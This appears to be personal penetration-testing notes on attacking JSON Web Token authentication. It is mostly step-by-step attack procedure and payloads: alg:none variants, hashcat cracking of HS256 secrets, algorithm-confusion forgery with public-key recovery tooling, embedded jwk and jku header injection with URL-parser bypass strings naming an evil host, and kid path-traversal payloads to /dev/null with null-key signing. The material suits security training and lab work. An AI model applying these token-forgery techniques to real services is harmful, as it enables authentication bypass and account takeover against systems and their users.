## JSON web tokens (JWTs)
A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot

- The header and payload parts of a JWT are just base64url-encoded JSON objects.
- The JWT spec is extended by both the JSON Web Signature (JWS) and JSON Web Encryption (JWE) specifications, which define concrete ways of actually implementing JWTs. 
- In other words, a JWT is usually either a JWS or JWE token. When people use the term "JWT", they almost always mean a JWS token


### Check JWT is verified or not
- Prerequisite: Install JWT editor
- Nodejs library has jsonwebtoken which has verify() and decode() method. Sometime verify() is not used by developers and decode() is used.
- JWT header:
  - alg: `none` means no signature (add `.` at end) or algorithm
  - bypass these filters using classic obfuscation techniques, such as mixed capitalization and unexpected encodings. 


- Using portswigger/JWT Editor

    Find the public key, usually in `/jwks.json` or `/.well-known/jwks.json`
    Load it in the JWT Editor Keys tab, click New RSA Key.
    . In the dialog, paste the JWK that you obtained earlier: {"kty":"RSA","e":"AQAB","use":"sig","kid":"961a...85ce","alg":"RS256","n":"16aflvW6...UGLQ"}
    Select the PEM radio button and copy the resulting PEM key.
    Go to the Decoder tab and Base64-encode the PEM.
    Go back to the JWT Editor Keys tab and generate a New Symmetric Key in JWK format.
    Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied.
    Edit the JWT token alg to HS256 and the data.
    Click Sign and keep the option: Don't modify header

- JWT Signature - Recover Public Key From Signed JWTs
  https://github.com/SecuraBV/jws2pubkey
- JWT headers with the following key of interests
  - jwk: json web key
    - HS256 (HMAC + SHA156) uses a symmetric key
    - RS256 (RSA + SHA256) uses a assymetric key
    - Algorith for verify 
      ```
          function verify(token, secretOrPublicKey){
          algorithm = token.getAlgHeader();
          if(algorithm == "RS256"){
              // Use the provided key as an RSA public key
          } else if (algorithm == "HS256"){
              // Use the provided key as an HMAC secret key
          }
      }
      ```
      This could result in algorithmic confusion attack as Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256. In this case, if the server receives a token signed using a symmetric algorithm like HS256, the library's generic `verify()` method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature. 
    
  - jku: json web key uri: the website should trust only from specified uri but that too can be bypassed
    - https://expected-host:fakepassword@evil-host
    - https://evil-host#expected-host
    - https://expected-host.evil-host
    - or double encoding to bypass
  - kid: key id, there is no spec of which how to define the kid so it can be db-pid, file location, or random file or /dev/null (empty file). While kid is file path and prone to path traversal attack
  
TO read
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md
    https://github.com/ticarpi/jwt_tool
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md?plain=1

### Payload to try
- unverified signature. Just modify payload and send
- JWT header: `alg: none` and no signature (add `.` at end)
  - `alg: none` means no signature (add `.` at end)
  - `none`
  - `None`
  - `NONE`
  - `nOnE`
- if `jwks.json` is found then any payload can be signed
- ADD new RSA > JWT Repeater > Attack > Embedded JSON Web Token (EJWT)
- Bruteforce attack on the signature for (symmetric sig)`HS256` not the asymmetric `RS256`
  `hashcat -a 0 -m 16500 <jwt> <wordlist>` # -m reppresents hashmode and `16500` represent `HS256` jwt 
- Algorithm confusion attack
  1) Obtain the server's public key: Find 
     1) `/jwks.json` or `/.well-known/jwks.json` or 
     2) extract from two token `docker run --rm -it sig2n <token1> <token2>`
      ##### Initial setup:
      ```
      source ~/PycharmProjects/venvs/adobe_proj/bin/activate
      git clone https://github.com/silentsignal/rsa_sign2n.git
      cd rsa_sign2n/standalone
      sudo docker build . -t sig2n
      ```
      ##### Run
      `sudo docker run --rm -it sig2n`
      `python3 jwt_forgery.py <token1> <token2>`
        - Copy all the JWTs and hit the login page with each one to find the correct JWT.
        - Once the correct key is found, base64 encode the key present at file using the decoder.
        - Generate a new symmetric key and replace the value of `k` with the copied value.
        - Don't replace the `kid` in jwt header and send the request.
  2) Convert the public key to a suitable format: modify to PEM or other format using JWT editor. convert the key > encode the RSA PEM key(contains new line) > Create `HS256` key with k as the encoded RSA PEM key (does contain `==` at the end)
  3) Create a malicious JWT with a modified payload and the alg header set to `HS256`.
  4) Sign the token with HS256, using the public key as the secret.
- Check if `jwk` is accepted in header then 
  **How to check**: 


    With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.

    Generate a new RSA key.

    Send a request containing a JWT to Burp Repeater.

    In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.

    Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.

    Send the request to test how the server responds.

  **Attack steps**
  1) add any new generated RSA key using json web token tab > Attack > embed jwt token 
  or
  1) add `jwk` in header and modify `kid` and then sign and send
- Check if `jku` is accepted  
  - add header `jku` with a URL to check if pinged
  - setup a payload with content type as `application/json` with jwt payload as generated on JSON editor tab with RSA 512 being generated
    ```
    {
      "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        }
      ]
    }
    ```
  - add `jku` in header and modify `kid` and then sign and send
- Injecting via `kid` header parameter
  ```
  {
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
  }
  ```
  Sign the key with null path `/dev/null` and then sign it in burpsuite by first encoding base64 `null byte (AA==)`

  Sign using null key
    Click New Symmetric Key on JWT editor

    In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.

    Replace the generated value for the k property with a Base64-encoded null byte `(AA==)`. Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.

    Click OK to save the key.
    After changing the kid with different null paths like `../../dev/null`, click sign with the generated key

- Injecting via `kid` header parameter where kid is db related value
  `kid` might be prone to SQL injection attack
  - create the key with jwt editor > new symmetric key > `AA==` in value of `k`
  - add `kid` as null value `/dev/null` and different combination
    - `../dev/null/`
    - all other payloads present here `../small-script-payload/path_traversal_payload/deep_traversal.txt` or `psychoPATH` addon
    - `sed 's|{FILE}|dev/null|g' ../small-script-payload/path_traversal_payload/deep_traversal.txt` 
    - few file payload
    ```
    ../dev/null
    ../../dev/null
    ../../../dev/null
    ../../../../dev/null
    ../../../../../dev/null
    ../../../../../../dev/null
    ../../../../../../../dev/null
    ../../../../../../../../dev/null
    ```
- `cty` (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a cty header to change the content type to text/xml or application/x-java-serialized-object, which can potentially enable new vectors for XXE and deserialization attacks.
- `x5c` (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the jwk header injection attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out CVE-2017-2800 and CVE-2018-2633.
